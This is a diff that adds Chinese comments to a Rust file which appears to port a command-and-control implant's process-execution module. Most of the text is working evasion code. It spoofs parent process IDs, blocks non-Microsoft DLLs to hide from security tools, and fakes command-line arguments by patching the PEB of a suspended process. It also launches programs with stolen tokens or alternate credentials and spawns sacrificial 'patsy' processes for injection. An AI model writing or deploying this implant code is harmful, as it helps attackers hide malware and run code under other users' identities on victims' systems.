@@ -1,3 +1,5 @@
+//! 进程执行与派生（execute.cpp、spawn.cpp、process_block.cpp、
+//! process_ppid.cpp、ppidfriends.cpp）。对应 process.h。
 //! Process execution and spawning (execute.cpp, spawn.cpp, process_block.cpp,
 //! process_ppid.cpp, ppidfriends.cpp). Mirrors process.h.
 
@@ -28,6 +30,7 @@ pub const CREATE_SUSPENDED: u32 = 0x00000004;
 pub const CREATE_NEW_CONSOLE: u32 = 0x00000010;
 pub const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;
 
+/// 扩展属性修改器（EX_ATTR_MOD）。
 /// Extended attribute modifier (EX_ATTR_MOD).
 #[derive(Clone, Copy, Default)]
 pub struct ExAttrMod {
@@ -38,6 +41,7 @@ pub struct ExAttrMod {
     pub post: Option<unsafe extern "C" fn(*mut core::ffi::c_void)>,
 }
 
+/// 进程上下文（PROCESS_CONTEXT）。
 /// Process context (PROCESS_CONTEXT).
 pub struct ProcessContext {
     pub cbuffer: Vec<u8>,
@@ -61,6 +65,7 @@ impl Default for ProcessContext {
     }
 }
 
+// ---- blockdlls（阻止 DLL 加载）------------------------------------
 // ---- blockdlls -----------------------------------------------------------
 
 static BLOCKDLLS: Mutex<bool> = Mutex::new(false);
@@ -76,7 +81,7 @@ pub fn command_blockdlls(buffer: &[u8], _length: usize) {
 }
 
 const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x1u64 << 44;
-const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007; // ProcThreadAttributeValue(7, FALSE, TRUE, FALSE)
+const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007; // 即 ProcThreadAttributeValue(7, FALSE, TRUE, FALSE) / ProcThreadAttributeValue(7, FALSE, TRUE, FALSE)
 
 unsafe extern "C" fn process_blockdlls_pre(
     thisp: *mut core::ffi::c_void,
@@ -100,7 +105,7 @@ unsafe extern "C" fn process_blockdlls_pre(
         post_error_d(0x47, GetLastError() as i32);
         return 0;
     }
-    mods.oerr = SetErrorMode(0x8001); // SEM_FAILCRITICALERRORS|SEM_NOGPFAULTERRORBOX|SEM_NOOPENFILEERRORBOX
+    mods.oerr = SetErrorMode(0x8001); // 错误模式标志：SEM_FAILCRITICALERRORS|SEM_NOGPFAULTERRORBOX|SEM_NOOPENFILEERRORBOX / SEM_FAILCRITICALERRORS|SEM_NOGPFAULTERRORBOX|SEM_NOOPENFILEERRORBOX
     1
 }
 
@@ -109,6 +114,7 @@ unsafe extern "C" fn process_blockdlls_post(thisp: *mut core::ffi::c_void) {
     SetErrorMode(mods.oerr);
 }
 
+/// 设置阻止 DLL 加载的属性（process_blockdlls）。
 /// Set the attribute to block DLLs (process_blockdlls).
 pub fn process_blockdlls() -> ExAttrMod {
     ExAttrMod {
@@ -118,6 +124,7 @@ pub fn process_blockdlls() -> ExAttrMod {
     }
 }
 
+// ---- PPID（父进程 ID）------------------------------------
 // ---- PPID ----------------------------------------------------------------
 
 static PPID: Mutex<u32> = Mutex::new(0);
@@ -135,6 +142,7 @@ fn is_same_desktop_session(pid: u32) -> bool {
     true
 }
 
+/// 为我们的 spawn 设置 PPID 值。
 /// Set the PPID value for our spawns.
 pub fn command_ppid(buffer: &[u8], _length: usize) {
     let mut parser = crate::parse::DataP::init(&mut buffer.to_vec());
@@ -143,6 +151,7 @@ pub fn command_ppid(buffer: &[u8], _length: usize) {
     if pid == 0 {
         return;
     }
+    // 若用户选择使用不同的桌面会话则发出警告
     // warn the user if they opt to use a different desktop session
     if !is_same_desktop_session(pid) {
         post_error_d(0xf, pid as i32);
@@ -166,7 +175,7 @@ unsafe extern "C" fn process_ppid_pre(
     if UpdateProcThreadAttribute(
         p_attribute_list,
         0,
-        0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+        0x00020000, // 即 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS（父进程属性）/ PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
         &h_parent_process as *const HANDLE as *const core::ffi::c_void,
         std::mem::size_of::<HANDLE>(),
         std::ptr::null_mut(),
@@ -186,6 +195,7 @@ unsafe extern "C" fn process_ppid_post(thisp: *mut core::ffi::c_void) {
     }
 }
 
+/// 设置父进程属性（process_ppid）。
 /// Set the parent process attribute (process_ppid).
 pub fn process_ppid() -> ExAttrMod {
     ExAttrMod {
@@ -195,6 +205,7 @@ pub fn process_ppid() -> ExAttrMod {
     }
 }
 
+// ---- 属性列表辅助函数（ppidfriends.cpp）------------------------------------
 // ---- attribute list helpers (ppidfriends.cpp) ----------------------------
 
 fn attr_cleanup(ptr: *mut core::ffi::c_void) {
@@ -234,10 +245,12 @@ fn count_proc_attributes(ppid: i32) -> u32 {
     }
 }
 
+/// 以任意 PPID 值执行指定程序的辅助函数。
 /// Helper to execute the specified program with an arbitrary PPID value.
 unsafe fn _execute_program_with_ppid(ctx: &mut ProcessContext, ppid: i32) -> bool {
     let count = count_proc_attributes(ppid);
 
+    // 没有需要修改的属性时的默认行为
     // default behavior when we have no attributes to modify
     if count == 0 {
         return execute_program(ctx);
@@ -248,6 +261,7 @@ unsafe fn _execute_program_with_ppid(ctx: &mut ProcessContext, ppid: i32) -> boo
     let mut mod_ppid = process_ppid();
     let mut mod_blockdlls = process_blockdlls();
 
+    // 依次执行我们的属性修改（pre）
     // walk our attribute modifications
     if ppid != 0 {
         if let Some(pre) = mod_ppid.pre {
@@ -266,18 +280,21 @@ unsafe fn _execute_program_with_ppid(ctx: &mut ProcessContext, ppid: i32) -> boo
         }
     }
 
+    // 配置我们的值以使用扩展启动信息（extended startup info）
     // setup our values to use an extended startup info
     let mut si_ex: STARTUPINFOEXA = std::mem::zeroed();
     si_ex.StartupInfo = *(ctx.si as *const STARTUPINFOA);
     si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;
     si_ex.lpAttributeList = attrs as *mut _;
 
+    // 更新上下文，使其指向 si_ex
     // update context to point to si_ex
     ctx.si = &mut si_ex as *mut STARTUPINFOEXA as *mut core::ffi::c_void;
     ctx.flags |= EXTENDED_STARTUPINFO_PRESENT;
 
     let result = execute_program(ctx);
 
+    // 依次执行属性修改并做清理（post）
     // walk our attribute modifications and do cleanup
     if ppid != 0 {
         if let Some(post) = mod_ppid.post {
@@ -294,6 +311,7 @@ unsafe fn _execute_program_with_ppid(ctx: &mut ProcessContext, ppid: i32) -> boo
     result
 }
 
+/// 以任意 PPID 执行程序（execute_program_with_ppid）。
 /// Execute a program with an arbitrary PPID (execute_program_with_ppid).
 pub fn execute_program_with_ppid(
     cbuffer: &[u8],
@@ -315,6 +333,7 @@ pub fn execute_program_with_ppid(
     unsafe { _execute_program_with_ppid(&mut context, ppid) }
 }
 
+/// 以默认 PPID 执行程序（execute_program_with_default_ppid）。
 /// Execute a program with the default PPID (execute_program_with_default_ppid).
 pub fn execute_program_with_default_ppid(
     cbuffer: &[u8],
@@ -328,6 +347,7 @@ pub fn execute_program_with_default_ppid(
     execute_program_with_ppid(cbuffer, clen, si, pi, flags, ignore_token, ppid)
 }
 
+// ---- execute.cpp（进程执行）------------------------------------
 // ---- execute.cpp ---------------------------------------------------------
 
 fn post_error_fmt(error: i32, fmt: std::fmt::Arguments<'_>) {
@@ -337,6 +357,7 @@ fn post_error_fmt(error: i32, fmt: std::fmt::Arguments<'_>) {
     crate::callback::post_error_sd(error, buff.as_bytes(), unsafe { GetLastError() } as i32);
 }
 
+/// 使用备用凭据执行程序。
 /// Execute a program with alternate credentials.
 unsafe fn execute_program_with_creds(ctx: &mut ProcessContext, wcmdline: &[u16], p_wcwd: Option<&[u16]>) -> bool {
     let creds = acreds();
@@ -356,6 +377,7 @@ unsafe fn execute_program_with_creds(ctx: &mut ProcessContext, wcmdline: &[u16],
     if result != 0 {
         return true;
     }
+    // （省略了仅 x86 的 sysnative 处理；本移植版本面向 x64。）
     // (x86-only sysnative handling omitted; the port targets x64.)
     post_error_sd(0x045, &ctx.cbuffer, GetLastError() as i32);
     false
@@ -368,12 +390,14 @@ unsafe fn execute_program_with_token(ctx: &mut ProcessContext) -> bool {
 
     (*(ctx.si as *mut STARTUPINFOA)).lpDesktop = std::ptr::null_mut();
 
+    // 将 cbuffer 转换为 wcmdline
     // convert cbuffer to wcmdline
     if !to_wide_char(&ctx.cbuffer, &mut wcmdline, 1024) {
         post_error_d(0x7, ctx.clen as i32);
         return false;
     }
 
+    // 取得当前工作目录
     // figure out the current working directory
     let size = GetCurrentDirectoryW(0, std::ptr::null_mut());
     if (size as usize) < 1024 {
@@ -381,6 +405,7 @@ unsafe fn execute_program_with_token(ctx: &mut ProcessContext) -> bool {
         p_wcwd = wcwd.as_ptr();
     }
 
+    // 回退到 CreateProcessWithTokenW
     // fall back to CreateProcessWithTokenW
     if CreateProcessWithTokenW(
         state::atoken() as HANDLE,
@@ -407,8 +432,10 @@ unsafe fn execute_program_with_token(ctx: &mut ProcessContext) -> bool {
 }
 
 unsafe fn _execute_program(ctx: &mut ProcessContext) -> bool {
+    // 我们持有令牌，希望用它来创建进程。
     // We have a token that we want to create the process with.
     if state::atoken() != 0 && !ctx.ignore_token {
+        // 创建我们的进程
         // create our process
         if CreateProcessAsUserA(
             state::atoken() as HANDLE,
@@ -431,6 +458,7 @@ unsafe fn _execute_program(ctx: &mut ProcessContext) -> bool {
         post_error_sd(0x29, &ctx.cbuffer, GetLastError() as i32);
         return false;
     }
+    // 请用常规方式创建进程
     // create the process the normal way plz
     else if CreateProcessA(
         std::ptr::null(),
@@ -452,6 +480,7 @@ unsafe fn _execute_program(ctx: &mut ProcessContext) -> bool {
     }
 }
 
+/// 执行程序（execute_program）。
 /// Execute a program (execute_program).
 pub fn execute_program(ctx: &mut ProcessContext) -> bool {
     unsafe {
@@ -459,13 +488,16 @@ pub fn execute_program(ctx: &mut ProcessContext) -> bool {
         if (ctx.flags & CREATE_SUSPENDED) != CREATE_SUSPENDED
             && argue_should_spoof(&ctx.cbuffer, &mut record)
         {
+            // 更新我们的上下文
             // update our context
             ctx.cbuffer = record.fakeargs.clone();
             ctx.flags |= CREATE_SUSPENDED;
 
+            // 以挂起状态执行我们的程序
             // execute our program in a suspended state
             let result = _execute_program(ctx);
 
+            // 通过修改 PEB 恢复其参数
             // restore its arguments by mucking with the PEB
             if !argue_restore(ctx.pi as *mut _, &record) {
                 TerminateProcess((*(ctx.pi as *mut PROCESS_INFORMATION)).hProcess, 0);
@@ -475,12 +507,14 @@ pub fn execute_program(ctx: &mut ProcessContext) -> bool {
             }
             return result;
         } else {
+            // 一切照常执行
             // execute everything as normal
             return _execute_program(ctx);
         }
     }
 }
 
+/// 所有这些参数均为 1024 字节（runas）。
 /// All of these args are 1024 bytes (runas).
 pub fn runas(
     domain: &[u8],
@@ -501,6 +535,7 @@ pub fn runas(
     si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
 
     unsafe {
+        // 进一步处理我们的启动信息数据结构
         // further process our startup info data structure
         GetStartupInfoW(&mut si);
         si.dwFlags = 0x00000100 | 0x00000001;
@@ -511,12 +546,14 @@ pub fn runas(
         si.lpDesktop = std::ptr::null_mut();
     }
 
+    // 将一些参数转换为宽字符变量
     // convert some parameters to their wide char vars
     to_wide_char(cmdline, &mut wcmdline, MAX_RUNAS_CMD);
     to_wide_char(user, &mut wuser, 1024);
     to_wide_char(pass, &mut wpass, 1024);
     to_wide_char(domain, &mut wdomain, 1024);
 
+    // 取得当前工作目录
     // figure out the current working directory
     let size = unsafe { GetCurrentDirectoryW(0, std::ptr::null_mut()) };
     if (size as usize) < 1024 {
@@ -524,6 +561,7 @@ pub fn runas(
         p_wcwd = wcwd.as_ptr();
     }
 
+    // 尝试执行该操作
     // try to execute the action
     let result = unsafe {
         CreateProcessWithLogonW(
@@ -549,16 +587,19 @@ pub fn runas(
     }
 }
 
+// ---- spawn.cpp（进程派生）------------------------------------
 // ---- spawn.cpp -----------------------------------------------------------
 
 static SPAWN_X86: Mutex<Vec<u8>> = Mutex::new(Vec::new());
 static SPAWN_X64: Mutex<Vec<u8>> = Mutex::new(Vec::new());
 
+/// 定义我们 spawn 到的目标（command_spawnproc）。
 /// Define where we will spawn to (command_spawnproc).
 pub fn command_spawnproc(buffer: &[u8], length: usize, x86: bool) {
     let mut sx86 = SPAWN_X86.lock();
     let mut sx64 = SPAWN_X64.lock();
 
+    // 重置两者
     // reset both of them
     if length == 0 || length > 256 {
         sx86.clear();
@@ -572,10 +613,12 @@ pub fn command_spawnproc(buffer: &[u8], length: usize, x86: bool) {
     }
 }
 
+/// 解析我们的 spawnproc。
 /// Resolve our spawnproc.
 fn spawnproc(dst: &mut [u8], x86: bool) {
     let mut temp = vec![0u8; 256];
 
+    // 获取我们架构对应的 spawn 值
     // grab the right spawn value for our architecture
     if x86 {
         let sx86 = SPAWN_X86.lock();
@@ -595,18 +638,22 @@ fn spawnproc(dst: &mut [u8], x86: bool) {
         }
     }
 
+    // 需要把环境变量展开到 dst
     // need to resolve environment variables into dst
     let tlen = temp.iter().position(|&c| c == 0).unwrap_or(temp.len());
     env_expand(&temp[..tlen], dst, dst.len() as u32);
 }
 
+/// 填充 spawn 命令的通用机制（spawn_populate）。
 /// Generic mechanism to populate our spawn command (spawn_populate).
 pub fn spawn_populate(x86: bool, cmdbuff: &mut [u8]) {
     cmdbuff.fill(0);
     spawnproc(cmdbuff, x86);
+    // （省略了仅 x86 的 sysnative/syswow64 修正；本移植版本面向 x64。）
     // (x86-only sysnative/syswow64 fixups omitted; port targets x64.)
 }
 
+/// 派生我们的临时进程（spawn_patsy）。
 /// Spawn our temporary process (spawn_patsy).
 pub fn spawn_patsy(
     x86: bool,
@@ -620,6 +667,7 @@ pub fn spawn_patsy(
     execute_program_with_default_ppid(&cmdbuff, clen, si, pi, CREATE_SUSPENDED, ignore_token)
 }
 
+/// 以另一个用户身份派生我们的临时进程（spawn_patsy_as）。
 /// Spawn our temporary process as another user (spawn_patsy_as).
 pub fn spawn_patsy_as(
     x86: bool,
@@ -634,6 +682,7 @@ pub fn spawn_patsy_as(
     runas(domain, user, pass, &cmdbuff[..clen], CREATE_SUSPENDED, pi)
 }
 
+/// 用于 spawn_patsy_u 的派生+注入（spawn_patsy_u）。
 /// Spawn+inject for spawn_patsy_u (spawn_patsy_u).
 pub fn spawn_patsy_u(
     x86: bool,
